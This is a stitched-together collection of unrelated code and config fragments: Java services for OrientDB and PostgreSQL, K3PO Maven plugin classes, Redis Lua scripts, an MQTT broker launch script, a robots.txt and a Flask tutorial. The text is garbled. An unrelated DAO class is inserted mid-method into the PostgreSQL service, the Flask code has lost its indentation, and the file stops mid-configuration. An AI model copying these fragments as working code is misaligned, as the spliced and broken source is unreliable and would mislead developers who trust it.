import org.atteo.classindex.IndexAnnotated;

/**
 * MBean marker interface.
 *
 * <p>
 * Any annotated classes will be discovered and registered by {@link JMX} service as MBean.
 * By convention any such class should implement an interface with the same name
 * with the suffix <i>MBean</i> added (see <a href="http://download.oracle.com/javase/tutorial/jmx/mbeans/standard.html">JMX tutorial</a>).
 * </p>
 * <p>
 * Additionally annotated class will be registered in Guice with {@link Singleton} scope.
 */
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
@IndexAnnotated
public @interface MBean {
	/**
	 * Name that the MBean will be registered with.
	 * <p>
	 * If not specified, one will be generated based on full class name of the annotated class.
	 * </p>
	 */
	String name() default "";
}
==============================================================================================================
import com.google.inject.AbstractModule;
import com.google.inject.Module;
import com.google.inject.Provider;
import com.google.inject.persist.PersistService;
import com.google.inject.servlet.RequestScoped;
import com.orientechnologies.orient.core.config.OGlobalConfiguration;
import com.orientechnologies.orient.core.db.document.ODatabaseDocumentPool;
import com.orientechnologies.orient.core.db.document.ODatabaseDocumentTx;
import org.atteo.config.XmlDefaultValue;
import org.atteo.moonshine.TopLevelService;

import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlRootElement;

@XmlRootElement(name = "orientdb")
public class OrientDb extends TopLevelService {
	@XmlElement(name = "url")
	@XmlDefaultValue("local:${dataHome}/orientdb")
	private String url;

	@XmlElement(name = "autocreate")
	@XmlDefaultValue("true")
	private Boolean autocreate;

	@XmlElement
	@XmlDefaultValue("admin")
	private String username;

	@XmlElement
	@XmlDefaultValue("admin")
	private String password;

	@XmlElement(name = "pool-timeout")
	@XmlDefaultValue("600000")
	private Integer poolTimeout;

	private PersistService persistService;

	private Provider<ODatabaseDocumentTx> provider = new Provider<ODatabaseDocumentTx>() {
		@Override
		public ODatabaseDocumentTx get() {
			return ODatabaseDocumentPool.global().acquire(url, username, password);
		}
	};

	public String getUrl() {
		return url;
	}

	public String getUsername() {
		return username;
	}

	public String getPassword() {
		return password;
	}

	public Boolean getAutocreate() {
		return autocreate;
	}

	@Override
	public Module configure() {
		return new AbstractModule() {
			@Override
			protected void configure() {
				OGlobalConfiguration.CLIENT_CONNECT_POOL_WAIT_TIMEOUT.setValue(poolTimeout);
				bind(ODatabaseDocumentTx.class).toProvider(provider).in(RequestScoped.class);
			}
		};
	}

	@Override
	public void start() {
		if (getAutocreate()) {
			ODatabaseDocumentTx db = new ODatabaseDocumentTx(url);
			if (!db.exists()) {
				db.create();
			}
			db.close();
		}
	}

	@Override
	public void stop() {
	}
}

import javax.inject.Inject;
import javax.sql.DataSource;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlIDREF;
import javax.xml.bind.annotation.XmlRootElement;

import org.atteo.moonshine.database.DatabaseService;
import org.atteo.moonshine.jta.JtaDataSourceWrapper;
import org.atteo.moonshine.jta.JtaService;
import org.atteo.moonshine.jta.PoolOptions;
import org.atteo.moonshine.services.ImportService;
import org.postgresql.ds.PGSimpleDataSource;
import org.postgresql.ds.common.BaseDataSource;
import org.postgresql.xa.PGXADataSource;

import com.google.inject.AbstractModule;
import com.google.inject.Module;
import com.google.inject.Provider;
import com.google.inject.Scopes;

/**
 * Connects to the PostgreSQL database.
 */
@XmlRootElement(name = "postgresql")
public class PostgreSQLService extends DatabaseService {
	@ImportService
	@XmlIDREF
	@XmlElement
	private JtaService jta;

	/**
	 * Sets the name of the PostgreSQL database, running on the server identified by the serverName property.
	 */
	@XmlElement(required = true)
	private String databaseName;

	/**
	 * Sets the name of the host the PostgreSQL database is running on. The default value is localhost.
	 */
	@XmlElement
	private String serverName;

	/**
	 * Sets the port which the PostgreSQL server is listening on for TCP/IP connections.
	 */
	@XmlElement
	private Integer portNumber;

	/**
	 * Database user.
	 */
	@XmlElement
	private String user = "";

	/**
	 * Database password.
	 */
	@XmlElement
	private String password = "";

	/**
	 * Connection pool options.
	 */
	@XmlElement
	private PoolOptions pool;

	@XmlElement
	private String testQuery = "select 1";

	@Inject
	private JtaDataSourceWrapper wrapper;

	private DataSource dataSource;

	private class DataSourceProvider implements Provider<DataSource> {
		@Inject
		private JtaDataSourceWrapper wrapper;

		private void configure(BaseDataSource dataSource) {
			dataSource.setDatabaseName(databaseName);
			if (serverName != null) {
				dataSource.setServerName(serverName);
			}
			if (portNumber != null) {
				dataSource.setPortNumber(portNumber);
			}

			if (user != null) {
				dataSource.setUser(user);
			}

			if (password != null) {
				dataSource.setPassword(password);
			}
		}

		@Override
		public DataSource get() {
			final PGSimpleDataSource migrationDataSource = new PGSimpleDataSource();
			configure(migrationDataSource);
			executeMigrations(migrationDataSource);

			final PGXADataSource xaDataSource = new PGXADataSource();
			configure(xaDataSource);

			String name = "defaultDataSource";
			if (getId() != null) {
				name = getId();
			}
			dataSource = wrapper.wrap(name, xaDataSource, pool, testQuery);
			return dataSource;
		}
	}

	@Override
	public Module configure() {
		return new AbstractModule() {
			@Override
			
			import java.util.List;
import java.util.Map;

import com.jeff.tianti.common.dao.CustomBaseSqlDaoImpl;
import com.jeff.tianti.org.entity.Resource;

public class ResourceDaoImpl extends CustomBaseSqlDaoImpl implements ResourceDaoCustom {

	@SuppressWarnings("unchecked")
	@Override
	public List<Resource> findMenuResource(Map<String, Object> params) {
		
		StringBuilder sb = new StringBuilder();
		sb.append("select r from Resource r where r.type in('module', 'page') ");
		
		Object deleteFlag = params.get("deleteFlag");
		if(deleteFlag != null){
			sb.append(" and r.deleteFlag = :deleteFlag ");
		}

		Object name = params.get("name");
		if(name != null){
			sb.append(" and r.name like :name ");
		}
		
		sb.append(" order by r.orderNo ");
		
		return this.queryByMapParams(sb.toString(), params, null, null);
	}

}
			protected void configure() {
				bind(DataSource.class).toProvider(new DataSourceProvider()).in(Scopes.SINGLETON);
			}
		};
	}

	@Override
	public void close() {
		if (dataSource != null) {
			wrapper.close(dataSource);
		}
	}
}

   private final Jackson2ResourceReader resourceReader;
    private final Resource sourceData;

    private ApplicationContext applicationContext;

    public AlbumRepositoryPopulator() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
        resourceReader = new Jackson2ResourceReader(mapper);
        sourceData = new ClassPathResource("albums.json");
    }
==============================================================================================================
#!/bin/sh
#
# Copyright (c) 2012-2015 Andrea Selva
#

echo "                                                                         "
echo "  ___  ___                       _   _        ___  ________ _____ _____  "
echo "  |  \/  |                      | | | |       |  \/  |  _  |_   _|_   _| "
echo "  | .  . | ___   __ _ _   _  ___| |_| |_ ___  | .  . | | | | | |   | |   "
echo "  | |\/| |/ _ \ / _\ | | | |/ _ \ __| __/ _ \ | |\/| | | | | | |   | |   "
echo "  | |  | | (_) | (_| | |_| |  __/ |_| ||  __/ | |  | \ \/' / | |   | |   "
echo "  \_|  |_/\___/ \__, |\__,_|\___|\__|\__\___| \_|  |_/\_/\_\ \_/   \_/   "
echo "                   | |                                                   "
echo "                   |_|                                                   "
echo "                                                                         "


cd "$(dirname "$0")"

# resolve links - $0 may be a softlink
PRG="$0"

while [ -h "$PRG" ]; do
  ls=`ls -ld "$PRG"`
  link=`expr "$ls" : '.*-> \(.*\)$'`
  if expr "$link" : '/.*' > /dev/null; then
    PRG="$link"
  else
    PRG=`dirname "$PRG"`/"$link"
  fi
done

# Get standard environment variables
PRGDIR=`dirname "$PRG"`

# Only set MOQUETTE_HOME if not already set
[ -f "$MOQUETTE_HOME"/bin/moquette.sh ] || MOQUETTE_HOME=`cd "$PRGDIR/.." ; pwd`
export MOQUETTE_HOME

# Set JavaHome if it exists
if [ -f "${JAVA_HOME}/bin/java" ]; then 
   JAVA=${JAVA_HOME}/bin/java
else
   JAVA=java
fi
export JAVA

LOG_FILE=$MOQUETTE_HOME/config/moquette-log.properties
MOQUETTE_PATH=$MOQUETTE_HOME/
#LOG_CONSOLE_LEVEL=info
#LOG_FILE_LEVEL=fine
JAVA_OPTS_SCRIPT="-XX:+HeapDumpOnOutOfMemoryError -Djava.awt.headless=true"

## Use the Hotspot garbage-first collector.
JAVA_OPTS="$JAVA_OPTS -XX:+UseG1GC"

## Have the JVM do less remembered set work during STW, instead
## preferring concurrent GC. Reduces p99.9 latency.
JAVA_OPTS="$JAVA_OPTS -XX:G1RSetUpdatingPauseTimePercent=5"

## Main G1GC tunable: lowering the pause target will lower throughput and vise versa.
## 200ms is the JVM default and lowest viable setting
## 1000ms increases throughput. Keep it smaller than the timeouts.
JAVA_OPTS="$JAVA_OPTS -XX:MaxGCPauseMillis=500"

## Optional G1 Settings

# Save CPU time on large (>= 16GB) heaps by delaying region scanning
# until the heap is 70% full. The default in Hotspot 8u40 is 40%.
#JAVA_OPTS="$JAVA_OPTS -XX:InitiatingHeapOccupancyPercent=70"

# For systems with > 8 cores, the default ParallelGCThreads is 5/8 the number of logical cores.
# Otherwise equal to the number of cores when 8 or less.
# Machines with > 10 cores should try setting these to <= full cores.
#JAVA_OPTS="$JAVA_OPTS -XX:ParallelGCThreads=16"

# By default, ConcGCThreads is 1/4 of ParallelGCThreads.
# Setting both to the same value can reduce STW durations.
#JAVA_OPTS="$JAVA_OPTS -XX:ConcGCThreads=16"

### GC logging options -- uncomment to enable

JAVA_OPTS="$JAVA_OPTS -XX:+PrintGCDetails"
JAVA_OPTS="$JAVA_OPTS -XX:+PrintGCDateStamps"
JAVA_OPTS="$JAVA_OPTS -XX:+PrintHeapAtGC"
JAVA_OPTS="$JAVA_OPTS -XX:+PrintTenuringDistribution"
JAVA_OPTS="$JAVA_OPTS -XX:+PrintGCApplicationStoppedTime"
JAVA_OPTS="$JAVA_OPTS -XX:+PrintPromotionFailure"
#JAVA_OPTS="$JAVA_OPTS -XX:PrintFLSStatistics=1"
#JAVA_OPTS="$JAVA_OPTS -Xloggc:/var/log/moquette/gc.log"
JAVA_OPTS="$JAVA_OPTS -XX:+UseGCLogFileRotation"
JAVA_OPTS="$JAVA_OPTS -XX:NumberOfGCLogFiles=10"
JAVA_OPTS="$JAVA_OPTS -XX:GCLogFileSize=10M"

$JAVA -server $JAVA_OPTS $JAVA_OPTS_SCRIPT -Dlog4j.configuration="file:$LOG_FILE" -Dmoquette.path="$MOQUETTE_PATH" -cp "$MOQUETTE_HOME/lib/*" io.moquette.server.Server


language: java
jdk:
  - openjdk12
before_cache:
  - rm -f  $HOME/.gradle/caches/modules-2/modules-2.lock
  - rm -fr $HOME/.gradle/caches/*/plugin-resolution/
cache:
  directories:
    - $HOME/.gradle/caches/
    - $HOME/.gradle/wrapper/

script:
    - ./gradlew install test
==============================================================================================================
https://www.programcreek.com/java-api-examples/index.php?project_name=JesseFarebro%2Fandroid-mqtt#
==============================================================================================================
git config --global push.default matching
git config --global push.default simple
==============================================================================================================
import static java.lang.String.format;
import static java.lang.System.currentTimeMillis;
import static java.lang.System.identityHashCode;
import static org.apache.maven.plugins.annotations.LifecyclePhase.POST_INTEGRATION_TEST;
import static org.apache.maven.plugins.annotations.ResolutionScope.TEST;

import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugins.annotations.Mojo;
import org.kaazing.k3po.driver.internal.RobotServer;

@Mojo(name = "stop", defaultPhase = POST_INTEGRATION_TEST, requiresDependencyResolution = TEST)
public class StopMojo extends AbstractMojo {

    protected void executeImpl() throws MojoExecutionException {

        RobotServer server = getServer();
        if (server == null) {
            getLog().error(format("K3PO not running"));
        }
        else {
            try {
                long checkpoint = currentTimeMillis();
                server.stop();
                float duration = (currentTimeMillis() - checkpoint) / 1000.0f;
                getLog().debug(format("K3PO [%08x] stopped in %.3fsec", identityHashCode(server), duration));

                setServer(null);
            }
            catch (Exception e) {
                throw new MojoExecutionException(format("K3PO [%08x] failed to stop", identityHashCode(server)), e);
            }
        }
    }
}
import static java.lang.String.format;
import static java.lang.System.currentTimeMillis;
import static java.lang.Thread.currentThread;
import static org.apache.maven.plugins.annotations.LifecyclePhase.PRE_INTEGRATION_TEST;
import static org.apache.maven.plugins.annotations.ResolutionScope.TEST;
import static org.jboss.netty.logging.InternalLoggerFactory.setDefaultFactory;

import java.io.File;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

import org.apache.maven.artifact.DependencyResolutionRequiredException;
import org.apache.maven.model.Dependency;
import org.apache.maven.model.Plugin;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.logging.Log;
import org.apache.maven.plugins.annotations.Mojo;
import org.apache.maven.plugins.annotations.Parameter;
import org.kaazing.k3po.driver.internal.RobotServer;
import org.kaazing.k3po.maven.plugin.internal.logging.MavenLoggerFactory;

/**
 * Start K3PO
 */
@Mojo(name = "start", defaultPhase = PRE_INTEGRATION_TEST, requiresDependencyResolution = TEST)
public class StartMojo extends AbstractMojo {

    @Parameter(defaultValue = "true", property = "maven.k3po.daemon")
    private boolean daemon;

    @Parameter(name = "control", defaultValue = "tcp://localhost:11642")
    private URI controlURI;

    @Parameter(defaultValue = "src/test/scripts")
    private File scriptDir;

    @Parameter(defaultValue = "false", property = "maven.k3po.verbose")
    private boolean verbose;

    @Parameter(property = "basedir")
    private File workingDirectory;

    public URI getControl() {
        return controlURI;
    }

    public void setControl(URI controlURI) {
        this.controlURI = controlURI;
    }

    @Override
    protected void executeImpl() throws MojoExecutionException {

        final ClassLoader contextClassLoader = currentThread().getContextClassLoader();

        try {
            Log log = getLog();
            if (log.isDebugEnabled()) {
                log.debug(format("Setting System property \"user.dir\" to [%s]", workingDirectory.getAbsolutePath()));
            }
            System.setProperty("user.dir", workingDirectory.getAbsolutePath());

            ClassLoader testClassLoader = createTestClassLoader();

            RobotServer server = new RobotServer(getControl(), verbose, testClassLoader);

            Map<?, ?> pluginsAsMap = project.getBuild().getPluginsAsMap();
            Plugin plugin = (Plugin) pluginsAsMap.get("org.kaazing:k3po-maven-plugin");
            if (plugin != null)
            {
                for (Dependency dependency : plugin.getDependencies())
                {
                    if (project.getGroupId().equals(dependency.getGroupId()) &&
                            project.getArtifactId().equals(dependency.getArtifactId()) &&
                            project.getVersion().equals(dependency.getVersion()))
                    {
                        // load extensions from project
                        currentThread().setContextClassLoader(testClassLoader);
                    }
                }
            }

            // TODO: detect Maven version to determine logger factory
            //         3.0 -> MavenLoggerFactory
            //         3.1 -> Slf4JLoggerFactory
            // see http://brettporter.wordpress.com/2010/10/05/creating-a-custom-build-extension-for-maven-3-0/

            // note: using SLf4J for Robot breaks in Maven 3.0 at runtime
            // setDefaultFactory(new Slf4JLoggerFactory());

            // use Maven3 logger for Robot when started via plugin
            setDefaultFactory(new MavenLoggerFactory(log));

            long checkpoint = currentTimeMillis();
            server.start();
            float duration = (currentTimeMillis() - checkpoint) / 1000.0f;
            if (log.isDebugEnabled()) {
                String version = (plugin != null) ? plugin.getVersion() : "unknown";
                if (!daemon) {
                    log.debug(format("K3PO [%s] started in %.3fsec (CTRL+C to stop)", version, duration));
                }
                else {
                    log.debug(format("K3PO [%s] started in %.3fsec", version, duration));
                }
            } else {
                if (!daemon) {
                    log.info("K3PO started (CTRL+C to stop)");
                }
                else {
                    log.info("K3PO started");
                }
            }

            setServer(server);

            if (!daemon) {
                server.join();
            }
        }
        catch (Exception e) {
            throw new MojoExecutionException("K3PO failed to start", e);
        }
        finally
        {
            currentThread().setContextClassLoader(contextClassLoader);
        }
    }

    private ClassLoader createTestClassLoader()
            throws DependencyResolutionRequiredException, MalformedURLException {
        List<URL> scriptPath = new LinkedList<>();
        if (scriptDir != null) {
            scriptPath.add(scriptDir.getAbsoluteFile().toURI().toURL());
        }
        for (Object scriptPathEntry : project.getTestClasspathElements()) {
            URI scriptPathURI = new File(scriptPathEntry.toString()).getAbsoluteFile().toURI();
            scriptPath.add(scriptPathURI.toURL());
        }

        ClassLoader parent = getClass().getClassLoader();
        return new URLClassLoader(scriptPath.toArray(new URL[scriptPath.size()]), parent);
    }
}

import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.MojoFailureException;
import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.project.MavenProject;
import org.kaazing.k3po.driver.internal.RobotServer;

/**
 * Abstract base class for Robot goals
 */
public abstract class AbstractMojo extends org.apache.maven.plugin.AbstractMojo {

    private static final ThreadLocal<RobotServer> ROBOT_SERVER = new ThreadLocal<>();

    @Parameter(defaultValue = "${project}", readonly = true)
    protected MavenProject project;

    @Parameter(defaultValue = "false", property = "skipTests")
    private boolean skipTests;

    @Parameter(defaultValue = "false", property = "skipITs")
    private boolean skipITs;

    @Override
    public final void execute() throws MojoExecutionException, MojoFailureException {

        if (skipTests || skipITs) {
            getLog().info("Tests are skipped");
            return;
        }

        executeImpl();
    }

    protected abstract void executeImpl() throws MojoExecutionException, MojoFailureException;

    protected void setServer(RobotServer server) {
        if (server == null) {
            ROBOT_SERVER.remove();
        }
        else {
            ROBOT_SERVER.set(server);
        }
    }

    protected RobotServer getServer() {
        return ROBOT_SERVER.get();
    }

}

import org.apache.maven.plugin.logging.Log;
import org.jboss.netty.logging.InternalLogger;
import org.jboss.netty.logging.InternalLoggerFactory;

public class MavenLoggerFactory extends InternalLoggerFactory {

    private final Log logger;

    public MavenLoggerFactory(Log logger) {
        this.logger = logger;
    }

    @Override
    public InternalLogger newInstance(String name) {
        return new MavenLogger(logger);
    }
}

==============================================================================================================
tcpdump -i <interface> -s 0 -w <some-file>
tshark -T pdml -r inputfile.cap -V -d tcp.port==8000,http | tee outputfile.pdml

java -jar target/com.kaazing.k3po.pcap.converter-develop-SNAPSHOT-jar-with-dependencies.jar <tcpDumpFile> <pdmlFile>

https://github.com/k3po/k3po/tree/develop/k3po.pcap.converter
==============================================================================================================
    @RequestMapping(value = "/sigfox/{deviceTypeId}", method = RequestMethod.POST)
    public void handleSigfoxRequest(@PathVariable String deviceTypeId,
                              @RequestHeader(TOKEN_HEADER) String token,
                              @RequestBody String body) throws Exception {
        service.processRequest(deviceTypeId, token, body);
    }
	
	    public static void putToNode(ObjectNode node, KvEntry kv) {
        switch (kv.getDataType()) {
            case BOOLEAN:
                node.put(kv.getKey(), kv.getBooleanValue().get());
                break;
            case STRING:
                node.put(kv.getKey(), kv.getStrValue().get());
                break;
            case LONG:
                node.put(kv.getKey(), kv.getLongValue().get());
                break;
            case DOUBLE:
                node.put(kv.getKey(), kv.getDoubleValue().get());
                break;
        }
    }
	import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.thingsboard.server.common.data.kv.*;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/**
 * Created by ashvayka on 19.01.17.
 */
public class JsonTools {

    private static final ObjectMapper JSON = new ObjectMapper();

    public static ObjectNode newNode() {
        return JSON.createObjectNode();
    }

    public static byte[] toBytes(ObjectNode node) {
        return toString(node).getBytes(StandardCharsets.UTF_8);
    }

    public static JsonNode fromString(String data) {
        try {
            return JSON.readTree(data);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static String toString(JsonNode node) {
        try {
            return JSON.writeValueAsString(node);
        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }
    }

    public static void putToNode(ObjectNode node, KvEntry kv) {
        switch (kv.getDataType()) {
            case BOOLEAN:
                node.put(kv.getKey(), kv.getBooleanValue().get());
                break;
            case STRING:
                node.put(kv.getKey(), kv.getStrValue().get());
                break;
            case LONG:
                node.put(kv.getKey(), kv.getLongValue().get());
                break;
            case DOUBLE:
                node.put(kv.getKey(), kv.getDoubleValue().get());
                break;
        }
    }

    public static List<KvEntry> getKvEntries(JsonNode data) {
        List<KvEntry> attributes = new ArrayList<>();
        for (Iterator<Map.Entry<String, JsonNode>> it = data.fields(); it.hasNext(); ) {
            Map.Entry<String, JsonNode> field = it.next();
            String key = field.getKey();
            JsonNode value = field.getValue();
            if (value.isBoolean()) {
                attributes.add(new BooleanDataEntry(key, value.asBoolean()));
            } else if (value.isLong()) {
                attributes.add(new LongDataEntry(key, value.asLong()));
            } else if (value.isDouble()) {
                attributes.add(new DoubleDataEntry(key, value.asDouble()));
            } else {
                attributes.add(new StringDataEntry(key, value.asText()));
            }
        }
        return attributes;
    }
}
==============================================================================================================
import java.util.HashMap;
import java.util.Map;

public class MonitoredMap<K,V> extends HashMap<K,V> {
    @Override
    public V put(K k, V v) {
        V ret = super.put(k, v);
        PromMetrics.mqtt_sessions.set(this.size());
        return ret;
    }

    @Override
    public void putAll(Map<? extends K, ? extends V> map) {
        super.putAll(map);
        PromMetrics.mqtt_sessions.set(this.size());
    }

    @Override
    public V remove(Object k) {
        V ret = super.remove(k);
        PromMetrics.mqtt_sessions.set(this.size());
        return ret;
    }
}
==============================================================================================================
import java.util.List;

/**
 * Created by giova_000 on 19/02/2015.
 */
class TokenInfo {
    private String authorizedUser;
    private List<String> scope;
    private Long expiryTime;
    private String errorMsg;

    String getAuthorizedUser() {
        return authorizedUser;
    }

    void setAuthorizedUser(String authorizedUser) {
        this.authorizedUser = authorizedUser;
    }

    List<String> getScope() {
        return scope;
    }

    void setScope(List<String> scope) {
        this.scope = scope;
    }

    Long getExpiryTime() {
        return expiryTime;
    }

    void setExpiryTime(Long expiryTime) {
        this.expiryTime = expiryTime;
    }

    String getErrorMsg() {
        return errorMsg;
    }

    void setErrorMsg(String errorMsg) {
        this.errorMsg = errorMsg;
    }

    @Override
    public String toString() {
        return authorizedUser +" ["+expiryTime+" "+scope+" "+errorMsg+"]";
    }
}

confluent-hub install confluentinc/kafka-connect-mqtt:1.1.0-preview
confluent-hub install confluentinc/kafka-connect-mqtt:1.2.3
==============================================================================================================
apply plugin: 'com.github.ben-manes.versions'

subprojects {

    apply plugin: 'java'
    apply plugin: 'maven'

    // Group Id
    group 'com.github.longkerdandy'

    // Version
    version '1.1.0.Beta1-SNAPSHOT'

    // JDK
    sourceCompatibility = 1.8

    // Encoding
    tasks.withType(JavaCompile) { options.encoding = 'UTF-8' }

    // Maven Repository
    repositories {
        mavenCentral();
    }

    // Dependencies
    dependencies {
        // apache commons
        compile 'org.apache.commons:commons-lang3:3.4'
        compile 'commons-configuration:commons-configuration:1.10'

        // logger
        compile 'org.slf4j:slf4j-api:1.7.21'
        compile 'ch.qos.logback:logback-core:1.1.7'
        compile 'ch.qos.logback:logback-classic:1.1.7'

        // junit
        testCompile 'junit:junit:4.12'

        // mock
        compile 'org.mockito:mockito-all:1.10.19'
        compile 'org.easymock:easymock:3.4'
    }
}

// gradle version plugin
buildscript {
    repositories {
        jcenter()
    }

    dependencies {
        classpath 'com.github.ben-manes:gradle-versions-plugin:0.13.0'
    }
}

dependencyUpdates.resolutionStrategy = {
    componentSelection { rules ->
        rules.all { ComponentSelection selection ->
            boolean rejected = ['alpha', 'beta', 'rc', 'cr', 'm'].any { qualifier ->
                selection.candidate.version ==~ /(?i).*[.-]${qualifier}[.\d-]*/
            }
            if (rejected) {
                selection.reject('Release candidate')
            }
        }
    }
}
==============================================================================================================
/**
 * Redis Lua Script
 */
public class RedisLua {

    // Increments the number stored at key by one with limit
    // Reset to 0 if limit reached (exceeded)
    //
    // Keys 1. Key to be increased
    // Args 1. Maximum number stored at key
    // Returns Number stored at key after increment
    public static final String INCRLIMIT =
            "local cnt = redis.call('INCR', KEYS[1])\n" +
                    "if tonumber(ARGV[1]) > 0 and cnt >= tonumber(ARGV[1])\n" +
                    "then\n" +
                    "   redis.call('SET', KEYS[1], '0')\n" +
                    "end\n" +
                    "return cnt";

    // Insert the specified value at the tail of the list with length limit
    // Removes the element at the head of the list if limit reached (exceeded)
    //
    // Keys 1. List pushed into
    // Args 1. Value to be pushed
    // Args 2. Maximum length of the list
    // Returns The value popped from the list, or nil
    public static final String RPUSHLIMIT =
            "local cnt = redis.call('RPUSH', KEYS[1], ARGV[1])\n" +
                    "if tonumber(ARGV[2]) > 0 and cnt > tonumber(ARGV[2])\n" +
                    "then\n" +
                    "   return redis.call('LPOP', KEYS[1])\n" +
                    "end\n" +
                    "return nil";

    // Insert the specified value to the sorted set with length limit
    // Removes the element at the head of the sorted set if limit reached (exceeded)
    //
    // Keys 1. Sorted Set added into
    // Args 1. Value to be added
    // Args 2. Maximum length of the sorted set
    // Returns The number of elements added to the sorted sets,
    // not including elements already existing for which the score was updated
    public static final String ZADDLIMIT =
            "local r = redis.call('ZADD', KEYS[1], ARGV[1], ARGV[2])\n" +
                    "local cnt = redis.call('ZCARD', KEYS[1])\n" +
                    "if tonumber(ARGV[3]) > 0 and cnt > tonumber(ARGV[3])\n" +
                    "then\n" +
                    "   redis.call('ZREMRANGEBYRANK', KEYS[1], 0, 0)\n" +
                    "end\n" +
                    "return r";

    // Removes the specified key only if its current value is equal to the given value
    //
    // Keys 1. Key to be deleted
    // Args 1. Value to be compared
    // Returns 1 if key is removed, 0 if key untouched
    public static final String CHECKDEL =
            "if ARGV[1] == redis.call('GET', KEYS[1])\n" +
                    "then\n" +
                    "   redis.call('DEL', KEYS[1])\n" +
                    "   return 1\n" +
                    "end\n" +
                    "return 0";
}
==============================================================================================================
User-agent: Googlebot
Disallow: /api/
Disallow: /merchantTerms/
Disallow: /login
Disallow: /logout
Disallow: /reservation/
Disallow: /reset_password
Disallow: /review/
Disallow: /site/
Disallow: /health/
Disallow: /version/ 
Disallow: */result
Disallow: */user/
Disallow: /forgot_password
Disallow: */widget

Disallow: /place/*/description
Disallow: /place/*/beschreibung
Disallow: /place/*/beschrijving
Disallow: /place/*/description
Disallow: /place/*/descrizione
Disallow: /place/*/description
Disallow: /place/*/kuvaus
Disallow: /place/*/aciklamasi 

Allow: /

User-agent: *
Disallow: /api/
Disallow: /merchantTerms/
Disallow: /checkout/
Disallow: /forgot_password
Disallow: /login
Disallow: /logout
Disallow: /reservation/
Disallow: /reset_password
Disallow: /review/
Disallow: /site/
Disallow: /user/
Disallow: /pl/
Disallow: /health/
Disallow: /version/
Disallow: */widget

User-Agent: AdIdxBot
Crawl-Delay: 15

User-agent: Bingbot
Disallow: /

User-agent: MSNBot
Disallow: /

User-agent: MSNBot-Media
Disallow: /

User-Agent: MJ12bot
Crawl-Delay: 15

User-agent: AhrefsBot
Crawl-Delay: 15

User-agent: Yandex
Disallow: /

User-agent: Baiduspider
Disallow: /

User-agent: Naver
Disallow: /

User-agent: Yeti
Disallow: /

User-agent: BLEXBot
Disallow: /

User-agent: SEMrushBot
Disallow: /

User-agent: MegaIndex.ru
Disallow: /

User-agent: adscanner
Disallow: /

User-agent: iisbot
Disallow: /

Sitemap: https://www.quandoo.com.au/sitemap.xml
==============================================================================================================
  @Bean
  public Docket api() {
    return new Docket(DocumentationType.SWAGGER_2)
        .apiInfo(apiInfo)
        .select()
        .apis(RequestHandlerSelectors.basePackage(
            PaymentsController.class.getPackage().getName()
        ))
        .paths(PathSelectors.ant("/api/v1/payments" + "/**"))
        .build()
        .useDefaultResponseMessages(false)
        .globalOperationParameters(
            newArrayList(new ParameterBuilder()
                .name("x-authorization")
                .description("X-Authorization")
                .modelRef(new ModelRef("string"))
                .parameterType("header")
                .required(false)
                .build()));
  }
==============================================================================================================
map.put(Environment.INDEXING_STRATEGY, "event");
		map.put("hibernate.search.autoregister_listeners", true);
		map.put("hibernate.search.default." + Environment.INDEX_MANAGER_IMPL_NAME, indexmanager);
		map.put("hibernate.search.default.directory_provider", directory_provider);
		map.put("hibernate.search.default.indexBase", indexBase);

import com.fasterxml.jackson.annotation.JsonSubTypes;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import org.eclipse.milo.opcua.sdk.client.api.identity.IdentityProvider;

/**
 * Created by ashvayka on 16.01.17.
 */
@JsonTypeInfo(
        use = JsonTypeInfo.Id.NAME,
        include = JsonTypeInfo.As.PROPERTY,
        property = "type")
@JsonSubTypes({
        @JsonSubTypes.Type(value = AnonymousIdentityProviderConfiguration.class, name = "anonymous"),
        @JsonSubTypes.Type(value = UsernameIdentityProviderConfiguration.class, name = "username")})
public interface IdentityProviderConfiguration {
    IdentityProvider toProvider();
}
==============================================================================================================
https://www.meteor.com/showcase
==============================================================================================================
Run the following command to create the virtual environment:

virtualenv --python=python3 python-tutorial￼

After this, enter the python-tutorial directory and activate the virtual environment with the following command:

source bin/activate

Next, install the Flask package using PIP.

pip install flask

Now using your favorite text editor, create a new file inside this directory and name the file flask-tut.py
touch flask-tut.py
vim flask-tut.py

Add the following code to the file flask-tut.py:

(click the insert key on your keyboard and then copy/paste to insert the code below)

# Import the Flask package
from flask import Flask
# Initialize Flask
app = Flask(__name__)
# Define the index route
@app.route("/")
def index():
return "Hello from Flask!"
# Run Flask if the __name__ variable is equal to __main__
if __name__ == "__main__":
app.run()

Lastly, execute the file by running:

python3 flask-tut.py

This starts the development web server. Part of the output when executed provides the address the server is listening on. Navigate to that address in a browser to display the Flask web application just created.

(flask_tutorial) Johns-MBP:flask_tutorial john$ python flask_tut.py
* Serving Flask app "flask_tut" (lazy loading)
* Environment: production
WARNING: This is a development server. Do not use it in a production deployment.
Use a production WSGI server instead.
* Debug mode: off<
* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
All requests and response codes will be logged to the output from the running server in the terminal.
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
<dependency>
    <groupId>org.fusesource.mqtt-client</groupId>
    <artifactId>mqtt-client</artifactId>
    <version>1.16</version>
</dependency>


language: java
before_deploy: "gradle jar addon"
deploy:
